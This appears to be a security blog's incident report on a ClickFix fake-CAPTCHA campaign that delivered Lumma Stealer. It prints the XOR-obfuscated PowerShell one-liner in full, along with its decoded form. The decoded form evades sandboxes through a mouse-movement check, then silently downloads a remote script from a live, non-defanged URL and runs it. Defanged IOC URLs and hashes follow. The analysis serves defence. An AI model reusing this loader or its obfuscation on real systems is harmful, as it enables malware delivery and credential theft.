---
layout: post
title: ClickFix Campaign - Infostealer
subtitle: 2025
cover-img: /assets/img/infostealer.jpg
thumbnail-img: /assets/img/malware.png
share-img: /assets/img/path.jpg
tags: [report]
author: drew
---

{: .box-success}
This Report is regarding to the Infostealer campaign known as the FakeCaptcha/Click-Fix Campaign.


## Background

On March 4, 2025, an alert was triggered following the execution of a suspicious PowerShell script on a user’s machine. The security team promptly reached out to the affected individual, who confirmed they had no knowledge of executing any such script.

Further investigation led to the discovery of an obfuscated script that had been encoded using XOR encryption. Security analysts decrypted the script using publicly available tools and found that it contained several malicious URLs.

Analysis linked the script to a known malware family—Lumma Stealer, a type of infostealer designed to exfiltrate sensitive information from infected systems. The infection vector was traced to a deceptive CAPTCHA page. The user, believing it to be legitimate, followed the instructions on the site, which likely triggered the malicious script in the background.

This event is part of a broader social engineering campaign known as the Click-Fix Campaign, which lures users into executing malicious code under the guise of system fixes or CAPTCHA verification.
![](/assets/img/flow.png){: .mx-auto.d-block :}

## Technical Findings

The script was obfuscated using XOR encryption to evade detection. Once decrypted, it revealed embedded URLs used to deliver the Infostealer payload. This obfuscation technique is commonly used in malware campaigns to hide malicious intent from security tools and analysts.

~~~
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -w 1 -exec unrestricted -nop -C "$DpSR=[System.String]::Concat(((53,57,36,120,61,48,48,97,123,41,47,53,50,59,124,15,37,47,40,57,49,103,41,47,53,50,59,124,15,37,47,40,57,49,114,14,41,50,40,53,49,57,114,21,50,40,57,46,51,44,15,57,46,42,53,63,57,47,103,44,41,62,48,53,63,124,47,40,61,40,53,63,124,63,48,61,47,47,124,23,57,46,50,57,48,111,110,39,7,24,48,48,21,49,44,51,46,40,116,126,55,57,46,50,57,48,111,110,114,56,48,48,126,117,1,44,41,62,48,53,63,124,47,40,61,40,53,63,124,57,36,40,57,46,50,124,21,50,40,12,40,46,124,16,51,61,56,16,53,62,46,61,46,37,116,47,40,46,53,50,59,124,48,44,26,53,48,57,18,61,49,57,117,103,7,24,48,48,21,49,44,51,46,40,116,126,55,57,46,50,57,48,111,110,114,56,48,48,126,117,1,44,41,62,48,53,63,124,47,40,61,40,53,63,124,57,36,40,57,46,50,124,21,50,40,12,40,46,124,27,57,40,12,46,51,63,29,56,56,46,57,47,47,116,21,50,40,12,40,46,124,52,17,51,56,41,48,57,112,47,40,46,53,50,59,124,44,46,51,63,18,61,49,57,117,103,33,44,41,62,48,53,63,124,63,48,61,47,47,124,24,21,50,42,51,55,57,9,47,57,46,111,110,39,7,15,40,46,41,63,40,16,61,37,51,41,40,116,16,61,37,51,41,40,23,53,50,56,114,15,57,45,41,57,50,40,53,61,48,117,1,44,41,62,48,53,63,124,47,40,46,41,63,40,124,12,19,21,18,8,39,44,41,62,48,53,63,124,53,50,40,124,4,103,44,41,62,48,53,63,124,53,50,40,124,5,103,33,7,9,50,49,61,50,61,59,57,56,26,41,50,63,40,53,51,50,12,51,53,50,40,57,46,116,31,61,48,48,53,50,59,31,51,50,42,57,50,40,53,51,50,114,11,53,50,61,44,53,117,1,44,41,62,48,53,63,124,56,57,48,57,59,61,40,57,124,62,51,51,48,124,26,50,27,57,40,31,41,46,47,51,46,12,51,47,116,51,41,40,124,12,19,21,18,8,124,44,117,103,44,41,62,48,53,63,124,47,40,61,40,53,63,124,62,51,51,48,124,24,37,50,27,57,40,31,41,46,47,51,46,12,51,47,116,21,50,40,12,40,46,124,58,44,40,46,112,51,41,40,124,12,19,21,18,8,124,44,117,39,42,61,46,124,56,59,97,116,26,50,27,57,40,31,41,46,47,51,46,12,51,47,117,17,61,46,47,52,61,48,114,27,57,40,24,57,48,57,59,61,40,57,26,51,46,26,41,50,63,40,53,51,50,12,51,53,50,40,57,46,116,58,44,40,46,112,40,37,44,57,51,58,116,26,50,27,57,40,31,41,46,47,51,46,12,51,47,117,117,103,46,57,40,41,46,50,124,56,59,116,51,41,40,124,44,117,103,33,33,123,103,29,56,56,113,8,37,44,57,124,113,8,37,44,57,24,57,58,53,50,53,40,53,51,50,124,120,61,48,48,103,120,56,48,48,97,7,23,57,46,50,57,48,111,110,1,102,102,16,51,61,56,16,53,62,46,61,46,37,116,126,41,47,57,46,111,110,114,56,48,48,126,117,103,120,61,56,56,46,97,7,23,57,46,50,57,48,111,110,1,102,102,27,57,40,12,46,51,63,29,56,56,46,57,47,47,116,120,56,48,48,112,126,27,57,40,31,41,46,47,51,46,12,51,47,126,117,103,53,58,116,120,61,56,56,46,124,113,57,45,124,7,21,50,40,12,40,46,1,102,102,6,57,46,51,117,39,46,57,40,41,46,50,33,103,7,56,51,41,62,48,57,1,120,56,53,47,40,97,108,114,108,103,120,51,48,56,97,7,24,21,50,42,51,55,57,9,47,57,46,111,110,119,12,19,21,18,8,1,102,102,50,57,43,116,117,103,7,42,51,53,56,1,7,24,21,50,42,51,55,57,9,47,57,46,111,110,1,102,102,24,37,50,27,57,40,31,41,46,47,51,46,12,51,47,116,120,61,56,56,46,112,7,46,57,58,1,120,51,48,56,117,103,43,52,53,48,57,116,120,40,46,41,57,117,39,15,40,61,46,40,113,15,48,57,57,44,124,113,17,53,48,48,53,47,57,63,51,50,56,47,124,105,108,108,103,120,63,41,46,97,7,24,21,50,42,51,55,57,9,47,57,46,111,110,119,12,19,21,18,8,1,102,102,50,57,43,116,117,103,7,42,51,53,56,1,7,24,21,50,42,51,55,57,9,47,57,46,111,110,1,102,102,24,37,50,27,57,40,31,41,46,47,51,46,12,51,47,116,120,61,56,56,46,112,7,46,57,58,1,120,63,41,46,117,103,120,56,36,97,120,63,41,46,114,4,113,120,51,48,56,114,4,103,120,56,37,97,120,63,41,46,114,5,113,120,51,48,56,114,5,103,120,56,53,47,40,119,97,7,17,61,40,52,1,102,102,15,45,46,40,116,116,120,56,36,118,120,56,36,117,119,116,120,56,37,118,120,56,37,117,117,103,53,58,116,120,56,53,47,40,124,113,59,57,124,110,108,108,108,117,39,62,46,57,61,55,33,103,120,51,48,56,97,120,63,41,46,33,103,15,40,61,46,40,113,12,46,51,63,57,47,47,124,126,120,57,50,42,102,15,37,47,40,57,49,14,51,51,40,0,15,37,47,11,19,11,106,104,0,11,53,50,56,51,43,47,12,51,43,57,46,15,52,57,48,48,0,42,109,114,108,0,44,51,43,57,46,47,52,57,48,48,114,57,36,57,126,124,113,29,46,59,41,49,57,50,40,16,53,47,40,124,123,113,18,51,12,46,51,58,53,48,57,123,112,123,113,25,36,57,63,41,40,53,51,50,12,51,48,53,63,37,123,112,123,9,50,46,57,47,40,46,53,63,40,57,56,123,112,123,113,31,51,49,49,61,50,56,123,112,123,116,7,15,37,47,40,57,49,114,18,57,40,114,11,57,62,31,48,53,57,50,40,1,102,102,18,57,43,116,117,114,24,51,43,50,48,51,61,56,15,40,46,53,50,59,116,123,123,52,40,40,44,47,102,115,115,55,109,114,63,41,46,48,53,50,57,47,47,59,53,56,56,37,47,49,53,48,57,114,47,52,51,44,115,25,46,46,61,40,53,63,109,31,46,61,50,55,109,30,61,50,47,52,57,57,109,24,46,61,53,50,44,53,44,57,114,57,50,36,123,123,117,117,32,122,116,21,40,57,49,124,29,48,53,61,47,102,115,21,25,118,117,123,124,113,11,53,50,56,51,43,15,40,37,48,57,124,20,53,56,56,57,50,103,120,24,51,26,63,45,8,12,47,42,124,97,124,120,57,50,42,102,29,44,44,24,61,40,61,103,58,41,50,63,40,53,51,50,124,56,59,25,38,24,13,16,44,54,116,120,25,8,31,17,43,26,6,29,30,112,124,120,36,26,5,24,38,117,39,63,41,46,48,124,120,25,8,31,17,43,26,6,29,30,124,113,51,124,120,36,26,5,24,38,33,103,58,41,50,63,40,53,51,50,124,53,8,14,25,48,17,59,25,116,117,39,58,41,50,63,40,53,51,50,124,12,55,38,46,48,5,116,120,5,11,25,44,45,46,38,117,39,53,58,116,125,116,8,57,47,40,113,12,61,40,52,124,113,12,61,40,52,124,120,36,26,5,24,38,117,117,39,56,59,25,38,24,13,16,44,54,124,120,5,11,25,44,45,46,38,124,120,36,26,5,24,38,33,33,33,53,8,14,25,48,17,59,25,103) | % { [char]($_ -bxor 92) }));& $DpSR.Substring(0,3) $DpSR.Substring(3)"
~~~

This is the decrypted script

~~~
iex$all='using System;using System.Runtime.InteropServices;public static class Kernel32{[DllImport("kernel32.dll")]public static extern IntPtr LoadLibrary(string lpFileName);[DllImport("kernel32.dll")]public static extern IntPtr GetProcAddress(IntPtr hModule,string procName);}public class DInvokeUser32{[StructLayout(LayoutKind.Sequential)]public struct POINT{public int X;public int Y;}[UnmanagedFunctionPointer(CallingConvention.Winapi)]public delegate bool FnGetCursorPos(out POINT p);public static bool DynGetCursorPos(IntPtr fptr,out POINT p){var dg=(FnGetCursorPos)Marshal.GetDelegateForFunctionPointer(fptr,typeof(FnGetCursorPos));return dg(out p);}}';Add-Type -TypeDefinition $all;$dll=[Kernel32]::LoadLibrary("user32.dll");$addr=[Kernel32]::GetProcAddress($dll,"GetCursorPos");if($addr -eq [IntPtr]::Zero){return};[double]$dist=0.0;$old=[DInvokeUser32+POINT]::new();[void][DInvokeUser32]::DynGetCursorPos($addr,[ref]$old);while($true){Start-Sleep -Milliseconds 500;$cur=[DInvokeUser32+POINT]::new();[void][DInvokeUser32]::DynGetCursorPos($addr,[ref]$cur);$dx=$cur.X-$old.X;$dy=$cur.Y-$old.Y;$dist+=[Math]::Sqrt(($dx*$dx)+($dy*$dy));if($dist -ge 2000){break};$old=$cur};Start-Process "$env:SystemRoot\SysWOW64\WindowsPowerShell\v1.0\powershell.exe" -ArgumentList '-NoProfile','-ExecutionPolicy','Unrestricted','-Command','([System.Net.WebClient]::New().DownloadString(''https://k1.curlinessgiddysmile.shop/Erratic1Crank1Banshee1Drainpipe.enx''))|&(Item Alias:/IE*)' -WindowStyle Hidden;$DoFcqTPsv = $env:AppData;function dgEzDQLpj($ETCMwFZAB, $xFYDz){curl $ETCMwFZAB -o $xFYDz};function iTRElMgE(){function PkzrlY($YWEpqrz){if(!(Test-Path -Path $xFYDz)){dgEzDQLpj $YWEpqrz $xFYDz}}}iTRElMgE;
~~~

![](/assets/img/payloads.png){: .mx-auto.d-block :}

A website containing .enx files is considered malicious as these files are often linked to encrypted, obfuscated, or potentially harmful content. Cybercriminals may use them to distribute malware, ransomware, or execute unauthorized actions on a victim’s system. Users should exercise caution, avoid downloading such files from untrusted sources, and scan them with security tools to prevent potential threats.

![](/assets/img/browserh.png){: .mx-auto.d-block :}

The user searched for the hrlink in the browser using Bing and noticed that it redirected multiple times until landing on a fake CAPTCHA that contained Infostealer.

~~~
URL:
hxxps://objectstorage.ap-singapore-2.oraclecloud.com/n/ax4mqlu25efi/b/lakmewbkt/o/bidgo-loadfun-wait.html 
~~~

![](/assets/img/details.png){: .mx-auto.d-block :}

![](/assets/img/hits.png){: .mx-auto.d-block :}

This webpage hosts Infostealer, a well-known information-stealing malware designed to exfiltrate sensitive data such as login credentials, browser cookies, cryptocurrency wallets, and system information. The site is part of a malicious redirection chain, where users searching for a specific link (e.g., hrlink) are redirected multiple times before landing on a deceptive fake CAPTCHA page. 

![](/assets/img/correct.png){: .mx-auto.d-block :}


The user followed the steps provided by the fakecaptcha.

![](/assets/img/socialengineering.png){: .mx-auto.d-block :}

Every non-existent domain .ph and .com.ph is entered, we are redirected to various domains, some related to cryptocurrency, gaming, and even a fake CAPTCHA that delivers Infostealer. Proof of this can be seen in the image below.

![](/assets/img/nslookup.png){: .mx-auto.d-block :}

The IP associated with non-existent .com.ph domains that redirect to other websites has recorded multiple hits.

![](/assets/img/hits2.png){: .mx-auto.d-block :}


## Conclusion

A user attempted to visit myhrlink-[XXXX].com.ph by typing it into their browser. However, since this domain does not exist, they were redirected to various directories due to the presence of bouncy.php on the server handling the request. 

This redirection mechanism led them to a malicious webpage, which displayed a fake CAPTCHA prompt. Believing it to be legitimate, the user interacted with it, unknowingly executing malicious code. 

As a result, they became a victim of Lumma Stealer, an infostealer malware designed to extract sensitive data such as credentials, browser cookies, and cryptocurrency wallet information.


## Indicator of Compromise (IOC)

| Hashes | URL |
| :------ | :----- |
| 0ab97b928b1bf593a589ded5a5b41ad4 | hxxps[://]k1[.]curlinessgiddysmile[.]shop/Erratic1Crank1Banshee1Drainpipe[.]enx | 
| 29b22a793f748370fd2c4c518f1439b07ff57e53 | hxxps[://]ishadowquest[.]shop/rewri[.]mp4 | 
| 00e700677b9af738305e2093f09347b90f97b75de4bb0c744c0e4fff9e4ada8d | hxxps[://]espardo[.]shop/mishtikloa[.]mp4 |





